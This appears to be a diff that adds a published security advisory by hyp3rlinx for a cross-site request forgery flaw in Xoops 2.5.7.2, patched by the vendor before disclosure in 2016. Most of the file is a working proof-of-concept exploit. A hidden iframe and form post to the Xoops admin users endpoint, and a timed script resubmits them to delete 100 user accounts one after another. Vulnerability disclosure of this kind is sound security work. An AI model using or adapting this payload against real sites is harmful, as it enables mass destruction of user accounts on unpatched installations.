@@ -1,0 +1,91 @@
+<!--
+[+] Credits: John Page aka hyp3rlinx
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/XOOPS-CSRF.txt
+
+
+Vendor:
+=============
+xoops.org
+
+
+Product:
+================
+Xoops 2.5.7.2
+
+
+Vulnerability Type:
+===================================
+CSRF - Arbitrary User Deletions
+
+
+Vulnerability Details:
+=====================
+
+Xoops 2.5.7.2 has CSRF vulnerability where remote attackers can delete ALL
+users from the Xoops database.
+
+
+References:
+http://xoops.org/modules/news/article.php?storyid=6757
+
+
+Exploit Codes:
+=============
+
+Following CSRF attack delete all users from database, following POC code
+will sequentially delete 100 users from the Xoops application.
+-->
+
+<iframe name="ifrm" style="display:none" name="hidden-form"></iframe>
+
+<form target="ifrm" name='memberslist' id='CSRF' action='
+http://localhost/xoops-2.5.7.2/htdocs/modules/system/admin.php?fct=users'
+method='POST'>
+<input type="hidden" id="ids" name="memberslist_id[]" />
+<input type="hidden" name="fct" value="users" />
+<input type="hidden" name="edit_group" value="" />
+<input type="hidden" name="selgroups" value="" />
+<input type="hidden" name="op" value="users_add_delete_group" />
+<input type="hidden" name="op" value="action_group" />
+<input type="hidden" name="Submit" value="Submit+Query" />
+</form>
+
+<script>
+var c=-1
+var amttodelete=100
+var id=document.getElementById("ids")
+var frm=document.getElementById("CSRF")
+function doit(){
+c++
+arguments[1].value=c
+arguments[0].submit()
+if(c>=amttodelete){
+  clearInterval(si)
+  alert("Done!")
+}
+}
+var si=setInterval(doit, 1000, frm, id)
+</script>
+
+<!--
+Disclosure Date:
+==================================
+Jan 29, 2016: Vendor Notification
+Vendor confirms and patches Xoops
+March 17, 2016 : Public Disclosure
+
+=================================
+
+[+] Disclaimer
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and that due
+credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit is given to
+the author.
+The author is not responsible for any misuse of the information contained
+herein and prohibits any malicious use of all security related information
+or exploits by the author or elsewhere. (c) hyp3rlinx.
+-->
